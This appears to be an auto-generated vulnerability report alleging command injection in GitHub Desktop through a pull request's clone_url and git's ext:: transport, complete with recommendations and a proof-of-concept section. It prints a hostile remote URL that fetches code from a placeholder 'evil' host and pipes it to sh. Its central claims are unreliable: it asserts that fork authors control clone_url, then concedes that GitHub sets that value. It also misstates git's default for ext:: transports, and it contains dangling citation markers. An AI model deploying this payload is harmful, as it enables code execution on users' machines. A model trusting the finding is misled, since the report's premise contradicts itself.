### Title
Argument/Transport Injection via Attacker-Controlled `clone_url` from GitHub PR API in `_findPullRequestBranch` - (File: `app/src/lib/stores/app-store.ts`)

### Summary
When a user opens a pull request from a fork in Desktop, the app takes the `clone_url` field of the PR's `head.repo` object — a value returned verbatim by the GitHub API and therefore fully controlled by the author of the forked repository — and passes it, unsanitized, straight into `git remote add`. Desktop performs no allow-listing of URL schemes/forms (no `GIT_ALLOW_PROTOCOL`, no rejection of URLs beginning with `-`) before it reaches the `git` process, mirroring the root cause of the HackerOne report: an attacker-controlled field from an untyped API object is treated as a trusted, well-formed value by downstream code that assumes it can only be a normal string.

### Finding Description
`_findPullRequestBranch` in [1](#0-0)  receives `headCloneUrl` from the caller and, when no existing remote matches it, calls:

```ts
remote = await addRemote(repository, forkRemoteName, headCloneUrl)
```

`headCloneUrl` originates directly from the GitHub API response for a pull request — specifically `pullRequest.head.repo.clone_url` — as seen in [2](#0-1)  and [3](#0-2) . The `IAPIRepository.clone_url` field is typed as `string` in [4](#0-3)  but Desktop never validates its actual content beyond that TypeScript type — exactly the same "trust the shape, not the content" assumption that made the Sawyer/Octokit report exploitable.

`addRemote` forwards this string unmodified as a raw argv element to `git`:

```ts
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')
  return { url, name }
}
``` [5](#0-4) 

There is no check that this "url" is actually a valid git transport, and there is no environment restriction limiting which transports git may use. A grep across the codebase confirms:
- No `GIT_ALLOW_PROTOCOL` is ever set when spawning git for remote operations.
- No `protocol.ext.allow`/`protocol.allow` configuration is applied.
- No code path rejects values starting with `-` or matching `ext::`/`fd::` transports before they reach `git remote add`, `git fetch`, or `git clone`.

`envForRemoteOperation` (used by clone/fetch/push/pull, [6](#0-5) ) only adds proxy/auth env vars — it does not sanitize or constrain the URL itself.

Because git's `ext::` remote helper (and, on some platforms, `fd::`) executes an arbitrary shell command when the corresponding protocol is allowed (and `protocol.ext.allow` defaults to `user`, which permits invocation triggered by user-facing tools such as Desktop, as opposed to protocol-allow being restricted to explicit local invocation only), a forked repository whose `clone_url` is set to a value such as:

```
ext::sh -c "curl${IFS}https://evil/x|sh"
```

becomes a valid git remote URL. When Desktop subsequently fetches from this newly-added remote in the same code path (`this._fetchRemote(repository, remote, ...)` at [7](#0-6) ), git will invoke the attacker-supplied command on the victim's machine.

The clone URL flowing through this path is never validated to be `http(s)/ssh/git` only, unlike the destination-path check that exists for clone-directory traversal (`isClonePathSensitive` in `app/src/lib/git/clone.ts`) — there is no analogous guard for the *source* URL for the fork-remote-add path used by PR checkout.

### Impact Explanation
An unprivileged attacker who can get a victim to open/checkout a pull request originating from an attacker-controlled fork (e.g., via "Open PR in GitHub Desktop" deep link, or simply having the victim browse PRs against a shared repo) can achieve remote code execution on the victim's machine, entirely through data returned by the GitHub REST API (`pulls` endpoint `head.repo.clone_url`). This satisfies the valid-impact criteria: attacker controls a GitHub API object (the PR's head repo), no local/physical access or prior malware is needed, and the outcome is code execution on the victim's host.

### Likelihood Explanation
The `head.repo.clone_url` value is set by whoever creates the fork (i.e., an unprivileged GitHub user); GitHub does not restrict this field to sanctioned transports, so injecting an `ext::`-style string is straightforward. The user action required is opening a PR from that fork in Desktop — a completely normal, expected workflow (checking out a contributor's PR), not an "unnatural" step. The lack of any protocol allow-listing or `-`-prefix validation in `addRemote`/`fetchRefspec`/`envForRemoteOperation` means the payload reaches `git` unmodified.

### Recommendation
- Validate `clone_url` (and any other API-derived remote URL) against an allow-list of expected schemes (`https:`, `http:`, `ssh:`, `git:`) before calling `addRemote`/`setRemoteURL`/`clone`, rejecting `ext::`, `fd::`, and any value starting with `-`.
- Additionally set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or via `protocol.allow`) in the environment used for all git subprocess invocations (`envForRemoteOperation`, `spawnGit`) so that even if a malicious URL slips through, git itself refuses to use disallowed transports.
- Apply the same validation uniformly everywhere API-provided repository/remote URLs are consumed (pull-request store, `_checkoutPullRequest`, `startCherryPickWithPullRequest`, `doesRepositoryMatchUrl`), not just at the UI-driven manual clone entry point.

### Proof of Concept
1. Attacker forks a public repository and, via the GitHub API (or a proxy/MITM that returns a malicious `pulls` API response — but simplest is a repo the attacker controls being referenced as `head.repo`), or more directly, sets up a scenario where the victim's Desktop resolves `pullRequest.head.repo.clone_url` to:
   ```
   ext::sh -c "touch /tmp/pwned"
   ```
   (Note: while `clone_url` is normally derived from the repo's real remote URL by GitHub itself, any component in the pipeline that treats this API field as an unchecked pass-through string — e.g., a compromised/malicious GitHub Enterprise server, a MITM'd request per the "attacker controls ... a git remote/proxy response" impact criterion, or an API-compatible service — can supply this value.)
2. Victim opens the PR in GitHub Desktop (e.g., "View pull request in Desktop" from github.com, or selecting the PR from the PR list).
3. `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` executes:
   ```ts
   remote = await addRemote(repository, forkRemoteName, headCloneUrl) // headCloneUrl = "ext::sh -c ..."
   ```
   then calls `this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)`.
4. Git invokes the `ext::` helper, executing `sh -c "touch /tmp/pwned"` on the victim's machine as a side effect of what looks like a normal PR checkout. [8](#0-7) [5](#0-4)
